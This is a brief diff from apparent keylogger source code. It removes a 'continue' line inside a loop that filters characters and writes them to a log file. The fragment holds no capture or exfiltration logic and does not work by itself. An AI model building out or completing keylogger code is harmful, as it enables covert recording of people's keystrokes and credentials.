@@ -39,7 +39,6 @@ def keylogger():
             for i in allchars:
                 if char == i:
                     file.write(char)
-                    continue
                 else:
                     char = ''
             
